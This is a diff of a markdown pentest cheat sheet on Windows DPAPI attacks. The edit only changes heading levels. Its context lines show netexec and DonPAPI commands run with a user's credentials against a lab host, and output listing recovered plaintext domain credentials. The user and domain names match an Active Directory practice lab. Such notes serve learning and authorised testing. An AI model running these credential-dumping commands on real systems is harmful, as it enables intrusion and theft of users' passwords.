@@ -1,6 +1,6 @@
 **DPAPI Attacks** are a method used in Windows environments where an attacker targets encrypted data. It works by exploiting the Data Protection API (DPAPI) to decrypt sensitive information, such as stored passwords or encryption keys, by obtaining the necessary credentials or keys to access the protected data.
 
-### Netexec
+#### Netexec
 
 ```bash
 nxc smb 192.168.56.11 -u ROBB.STARK -p sexywolfy --dpapi
@@ -12,8 +12,7 @@ SMB         192.168.56.11   445    WINTERFELL       [robb.stark][CREDENTIAL] Dom
 SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
 SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
 ```
-
-### Donpapi
+#### Donpapi
 
 ```bash
 donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
@@ -50,7 +49,7 @@ donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
 DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
-### MimiKatz
+#### MimiKatz
 
 WinPeas:
 
